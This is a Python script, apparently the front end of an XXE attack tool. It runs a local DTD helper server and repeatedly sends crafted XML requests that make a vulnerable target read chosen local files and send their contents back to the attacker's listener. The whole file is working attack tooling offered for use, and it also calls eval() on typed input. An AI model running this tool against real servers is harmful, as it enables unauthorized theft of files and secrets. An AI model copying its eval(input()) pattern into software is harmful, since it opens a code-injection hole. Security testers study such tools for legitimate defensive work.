#!/usr/bin/env python3

import sys, os
import signal
import argparse
from multiprocessing import Process
from lib.XXEServer import startServer
import time

from lib.AttackSession import AttackSession

def start_loop(attackSession, args):
    try:
        while True:
            print("------")
            targetFile = eval(input("Target File: "))
            print("[+] Sending XML request...")
            response = attackSession.sendPayload(targetFile, args.interface, args.listenPort)
            print(("[+] Server Response: {}".format(response.status_code)))
            
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)

def parseArgs():
    parser = argparse.ArgumentParser(description="Local File Explorer Using XXE DTD Entity Expansion")
    parser.add_argument('-f', '--requestFile', dest='requestFile', required=True, help="Vulnerable request file with {targetFilename}, {xxeHelperServerInterface}, and {xxeHelperServerPort} marked")
    parser.add_argument('-p', '--port', dest='port', default=80, help="Port on target host (eg 80, 443)")       #TODO: implement actually using this
    parser.add_argument('-t', '--targetHost', dest='targetHost', help="Override host header in request file")   #TODO: implement actually using this
    parser.add_argument('-l', '--listenPort', dest='listenPort', type=int, default=8000, help="Port for local DTD helper server")
    parser.add_argument('-i', '--listenIP', dest='interface', required=True, help="Bind IP address for local DTD helper server")
    parser.add_argument('--b64', dest='isb64', action='store_true', default=False, help="Flag if data will be base64 encoded (e.g. using php's convert.base64 function for files)")
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = parseArgs()
    print("[+] Starting server....")
    p = Process(target=startServer, kwargs=dict(ip=args.interface, port=args.listenPort, isb64=args.isb64))
    p.start()
    #Hacky way to make sure server is started before jumping in
    #TODO replace with proper messaging
    while True:
        if os.path.isfile('.server_started'):
            break

    attackSession = AttackSession(args.requestFile)
    #try:
    #    attackSession = AttackSession(args.requestFile)
    #except:
    #    print "[-] Could not open/read request file!"
    #    sys.exit(1)
            
    start_loop(attackSession, args)

    
    






    